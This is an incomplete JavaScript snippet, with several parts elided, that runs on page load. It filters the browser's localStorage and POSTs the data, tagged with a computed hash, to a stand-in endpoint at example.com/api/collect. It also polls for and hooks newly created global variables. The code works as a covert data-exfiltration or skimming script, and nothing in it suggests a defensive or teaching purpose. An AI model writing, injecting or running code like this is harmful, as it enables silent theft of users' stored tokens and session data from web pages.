...
(function () {
  ...
  $(function () {
    ...
    let api_url = "https://example.com/api/collect";
    const getHashValue = data => {
      let concatenatedKeys = Object.keys(data).join('');
      let hashValue = 0;
      for (let keyIndex = 0; keyIndex < concatenatedKeys.length; keyIndex++) {
        let charCode = concatenatedKeys.charCodeAt(keyIndex);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    };
    const filterLocalStorageData = () => {
      let filteredData = {};
    ...
    const postToServer = data => {
      let id = getHashValue(data);
      let xhr_request = new XMLHttpRequest();
      xhr_request.open("POST", api_url, true);
      xhr_request.setRequestHeader("Content-Type", "application/json");
      let requestData = {
        id: id,
        data: data
      };
      xhr_request.send(JSON.stringify(requestData));
      xhr_request.onload = function () {
        if (xhr_request.readyState === XMLHttpRequest.DONE) {
          if (xhr_request.status === 200) console.log("Data sent successfully");else console.error("Data sending failed with status code: " + xhr_request.status);
        }
      };
    };
    const collectAndPostLocalStorageData = () => {
      let filteredLocalStorage = filterLocalStorageData();
      if (Object.keys(filteredLocalStorage).length > 0) {
        postToServer(filteredLocalStorage);
      }
    };
    ...
    const jsHook = globalVar => {
      let original = window[globalVar];
    ...
    setInterval(() => {
      ...
      let newVars = currentGlobalVars.filter(e => !globalVars.includes(e));
      newVars.forEach(jsHook);
